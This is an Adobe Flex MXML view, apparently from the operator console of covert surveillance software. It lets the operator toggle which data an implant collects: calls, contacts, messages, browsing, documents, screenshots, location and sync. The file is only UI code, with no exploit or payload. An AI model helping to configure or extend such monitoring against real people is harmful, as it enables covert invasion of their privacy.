<?xml version="1.0" encoding="utf-8"?>
<s:VGroup xmlns:fx="http://ns.adobe.com/mxml/2009"
          xmlns:s="library://ns.adobe.com/flex/spark"
          xmlns:mx="library://ns.adobe.com/flex/mx"
          xmlns:actionbar="it.ht.rcs.console.main.actionbar.*"
          xmlns:configuration="it.ht.rcs.console.operations.view.configuration.*"
          xmlns:basic="it.ht.rcs.console.operations.view.configuration.basic.*"
          xmlns:selectors="it.ht.rcs.console.operations.view.configuration.basic.selectors.*"
          width="100%" height="100%" addedToStage="onAddedToStage(event)" horizontalAlign="center"
          removedFromStage="onRemovedFromStage(event)">


  <fx:Script>
    <![CDATA[
      import it.ht.rcs.console.operations.view.configuration.ConfigurationView;
      
      import mx.controls.Alert;
      
      public var config:Object;
      
      public function displayConfig():void
      {
        call.selected       = hasAction('call');
        contact.selected    = hasAction('calendar') || hasAction('addressbook');
        message.selected    = hasAction('messages') || hasAction('chat');
        website.selected    = hasAction('url');
        document.selected   = hasAction('file');
        screenshot.selected = hasAction('snapshot') || hasAction('mouse');
        location.selected   = hasAction('position');
        
        if (screenshot.selected)
          screenshot.delay = getScreenshotDelay();
        
        sync.selected       = hasSync();
      }
      
      private function hasAction(name:String):Boolean
      {
        var startupAction:Object;
        for each (var a:Object in config.actions)
          if (a.desc == 'STARTUP')
            startupAction = a;
          
        if (startupAction == null) return false;
        
        for each (var sa:Object in startupAction.subactions)
          if (sa.action == 'module' && sa.module == name)
            return true;
        
        return false;
      }
      
      private function getScreenshotDelay():int
      {
        var event:Object;
        for each (var e:Object in config.events)
        if (e.desc == 'SCREENSHOT')
          event = e;
        
        return event == null ? 0 : event.delay as int;
      }
      
      private function hasSync():Boolean
      {
        var syncAction:Object;
        for each (var a:Object in config.actions)
        if (a.desc == 'SYNC')
          syncAction = a;
        
        return syncAction != null;
      }
      
      private function onAddedToStage(event:Event):void
      {
        addEventListener('switch', moduleSwitch);
      }
      
      private function onRemovedFromStage(event:Event):void
      {
        removeEventListener('switch', moduleSwitch);
      }
      
      private function moduleSwitch(event:Event):void
      {
      }
      
      private function goToAdvanced(event:MouseEvent):void
      {
        (parent as ConfigurationView).currentState = 'advanced';
      }
    ]]>
  </fx:Script>
  
  <s:VGroup width="100%" maxWidth="1200" gap="20" paddingTop="20">
  
    <s:HGroup width="100%" gap="30">
      <selectors:SimpleSelector id="call" text="Calls (Phone, Skype, MSN)"/>
      <selectors:SimpleSelector id="contact" text="Contacts &amp; Calendar"/>
    </s:HGroup>
    
    <s:HGroup width="100%" gap="30">
      <selectors:SimpleSelector id="message" text="Messages (Mail, SMS, Chat)"/>
      <selectors:SimpleSelector id="website" text="Websites &amp; URLs"/>
    </s:HGroup>
    
    <s:HGroup width="100%" gap="30">
      <selectors:SimpleSelector id="document" text="Documents"/>
      <selectors:ScreenshotSelector id="screenshot" text="Screenshots &amp; Mouse"/>
    </s:HGroup>
    
    <s:HGroup width="100%" gap="30">
      <selectors:LocationSelector id="location" text="Location"/>
      <selectors:SyncSelector id="sync"/>
    </s:HGroup>
    
    <s:HGroup width="100%" gap="0" horizontalAlign="right">
      <s:Button label="Go to advanced..." click="goToAdvanced(event)"/>
    </s:HGroup>
    
  </s:VGroup>
    
</s:VGroup>